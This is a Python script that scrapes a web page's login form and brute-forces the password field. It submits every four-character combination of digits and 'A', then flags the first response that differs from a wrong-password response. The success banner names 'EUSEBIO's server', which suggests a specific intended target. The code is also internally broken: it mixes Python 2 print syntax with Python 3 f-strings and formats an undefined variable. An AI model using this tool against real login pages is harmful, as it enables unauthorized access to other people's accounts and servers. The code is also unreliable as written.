import sys, requests, itertools
from lxml.html import fromstring

def get_possibilities(charset, length):
    return map(''.join, itertools.product(charset, repeat=length))

def send_request(url, method, data):
    with requests.Session() as s:
        return s.get(url, params=data) if method == "GET" else s.post(url, data=data)

if len(sys.argv) != 2:
    print(f"Usage: {sys.argv[0]} <url>")
    sys.exit(1)

url = sys.argv[1]
print(f"[+] TARGET: {url}")

r = requests.get(url)
if r.status_code != 200:
    print(f"[-] Error reaching {url}")
    sys.exit(1)

form = fromstring(r.content).forms[0]
action = form.action if "http" in form.action else url + form.action
method = form.method.upper()
fields = dict(form.fields)
fields["PASSWORD"] = "wrong pinche password"

wrong_resp = send_request(action, method, fields).content
print(f"[+] WRONG PASSWORD RESPONSE: {wrong_resp}")

for pwd in get_possibilities("0123456789A", 4):
    fields["PASSWORD"] = pwd
    resp = send_request(action, method, fields).content
    if wrong_resp != resp:
        print """
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

[+] ------- CORRECT EUSEBIO's SERVER PASSWORD ---->> : {0}
                                                         
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
                                                         
                                                         """.format(PASSWORD)
        break
    else:
        print(f"[-] Tried: {pwd}")
